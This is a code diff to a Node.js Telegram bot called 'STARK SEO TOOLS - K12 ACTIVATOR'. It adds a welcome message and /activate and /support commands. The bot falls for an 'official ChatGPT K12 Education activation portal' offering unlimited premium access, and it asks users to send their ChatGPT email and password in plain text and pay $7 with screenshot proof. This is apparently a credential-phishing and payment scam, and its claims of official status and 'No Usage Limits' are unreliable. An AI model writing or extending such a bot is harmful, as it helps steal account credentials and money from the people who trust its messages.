@@ -124,6 +124,11 @@ if (bot) {
 // ==========================================
 if (k12Bot) {
     const userState = new Map();
+
+    // Add error handler
+    k12Bot.on('polling_error', (error) => {
+        console.log('K12 Bot Polling Error:', error.message);
+    });
     k12Bot.onText(/\/start/, async (msg) => {
         const userId = msg.from.id;
         let user = await getUser(userId);
@@ -135,7 +140,26 @@ if (k12Bot) {
                 referralCount: 0
             });
         }
-        k12Bot.sendMessage(msg.chat.id, `🎓 *Free K12 Activation Bot*\n\nWelcome! Use this bot to activate your K12 account.\n\n/balance - Check earnings\n/refer - Earn credits\n/redeem - Get free K12`, { parse_mode: 'Markdown' });
+        const welcomeMessage = '🌟 *STARK SEO TOOLS - K12 ACTIVATOR* 🌟\n\n' +
+            'Welcome to the official ChatGPT K12 Education activation portal. We specialize in transforming your standard account into a premium K12 Private EDU session.\n\n' +
+            '💎 *Why ChatGPT K12?*\n' +
+            '• No Usage Limits (Advanced Models)\n' +
+            '• Enhanced AI Creative Capabilities\n' +
+            '• Dedicated Private Session\n' +
+            '• 100% Secure & Reliable\n\n' +
+            '🚀 *Activation Flow:*\n' +
+            '1️⃣ Provide your account credentials.\n' +
+            '2️⃣ Complete the $7.00 manual payment.\n' +
+            '3️⃣ Send screenshot proof.\n' +
+            '4️⃣ Activated in 5-10 minutes!\n\n' +
+            'Upgrade your AI experience now!\n\n' +
+            '📋 *Available Commands:*\n' +
+            '/activate - Start activation process\n' +
+            '/balance - Check your balance\n' +
+            '/refer - Earn credits by referring friends\n' +
+            '/support - Get help';
+        
+        k12Bot.sendMessage(msg.chat.id, welcomeMessage, { parse_mode: 'Markdown' });
     });
 
     k12Bot.onText(/\/balance/, async (msg) => {
@@ -146,6 +170,14 @@ if (k12Bot) {
     k12Bot.onText(/\/refer/, async (msg) => {
         const refLink = `https://t.me/chatgptk12activationbot?start=${msg.from.id}`;
         k12Bot.sendMessage(msg.chat.id, `👥 Refer & Earn $0.10 per friend!\n\n🔗 Link: ${refLink}`);
+    });
+    
+    k12Bot.onText(/\/activate/, async (msg) => {
+        k12Bot.sendMessage(msg.chat.id, '🔐 *K12 Activation Process*\n\nPlease provide your ChatGPT account credentials:\n\n📧 Email:\n🔑 Password:\n\nSend them in this format:\nemail@example.com password123', { parse_mode: 'Markdown' });
+    });
+    
+    k12Bot.onText(/\/support/, async (msg) => {
+        k12Bot.sendMessage(msg.chat.id, '💬 *Support & Help*\n\nNeed assistance? Contact us:\n\n📧 Email: support@starkseotools.com\n💬 Telegram: @StarkSEOSupport\n\nResponse time: 5-15 minutes', { parse_mode: 'Markdown' });
     });
 }
 
